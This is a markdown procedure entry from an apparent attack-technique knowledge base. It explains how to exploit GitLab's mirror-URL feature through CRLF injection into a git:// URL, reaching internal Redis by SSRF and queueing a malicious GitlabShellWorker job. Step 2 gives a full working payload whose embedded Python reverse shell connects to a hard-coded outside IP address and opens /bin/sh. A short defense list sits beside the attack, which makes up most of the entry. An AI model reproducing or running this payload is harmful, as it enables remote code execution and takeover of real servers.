---
id: proc-inject-crlf-payload
tags:
  - crlf-injection
  - ssrf
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
  - '[[tools/Fiddler]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/redis-multi]]'
  - '[[commands/redis-sadd-queue]]'
  - '[[commands/redis-lpush-payload]]'
  - '[[commands/redis-exec]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Windows Command Shell]]'
updated_at: '2025-12-14T04:09:00.699Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Windows Command Shell]]'
---
---

# Inject CRLF Payload in Mirror URL

## Summary

This procedure intercepts the mirror addition POST request and injects a CRLF payload into the git:// URL to exploit SSRF against Redis, enqueuing a malicious job for RCE.

## Description

The git:// protocol bypasses GitLab's UrlBlocker, allowing SSRF to localhost:6379. CRLF injection (
) lets attackers append Redis commands like MULTI, SADD, LPUSH with a JSON payload for GitlabShellWorker, and EXEC. This manipulates the system_hook_push queue to execute class_eval with Python RCE code.

## Requirements

1. Authenticated GitLab session
2. Proxy tool like Burp Suite or Fiddler configured
3. Target Redis on 127.0.0.1:6379

## Defense

Defensive measures and detection strategies:

- Sanitize URL parameters to block newlines
- Block git:// protocol in mirroring
- Monitor HTTP requests for CRLF in params
- Use WAF to detect SSRF patterns

## Objectives

1. Exploit SSRF to reach internal Redis
2. Inject Redis transaction for queue manipulation
3. Enqueue RCE payload via GitlabShellWorker

## Instructions

### Step 1: Intercept Add Mirror Request

**Context**: Capture the POST to /projects/:id using proxy.

**Command** (Burp/Fiddler action):
Configure proxy and submit mirror form.

> Expected output: Request captured in proxy.

### Step 2: Modify URL Parameter with Payload

**Context**: Alter project[remote_mirrors_attributes][0][url] to inject CRLF and Redis commands.

**Command** (payload injection):
Set to: `git://127.0.0.1:6379/\nmulti\nsadd resque:gitlab:queues system_hook_push\nlpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open(\'|/usr/bin/python3 -c \\\\import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(\\"118.89.198.146\",8000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/sh\",\\\"-i\\\"]);\\\\'\').read\"],\"retry\":3,\"queue\":\"system_hook_push\",\"jid\":\"ad52abc5641173e217eb2e52\",\"created_at\":1513714403.8122594,\"enqueued_at\":1513714403.8129568}"\nexec\n/bbbbb/ccccc'

> This triggers [[commands/redis-multi]], [[commands/redis-sadd-queue]], [[commands/redis-lpush-payload]], [[commands/redis-exec]]. Expected output: Modified request forwarded, 200 OK.

### Step 3: Forward and Verify

**Context**: Send modified request and check for errors.

**Command** (proxy forward):
Forward in Burp/Fiddler.

> Expected output: Mirror added, no UI errors.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[Windows Command Shell]]

### Sub-Techniques


## Commands Used

- [[commands/redis-multi]]
- [[commands/redis-sadd-queue]]
- [[commands/redis-lpush-payload]]
- [[commands/redis-exec]]

## Tools Used

- [[tools/Burp-Suite]]
- [[tools/Fiddler]]

## Tags

- [[crlf-injection]]
- [[ssrf]]

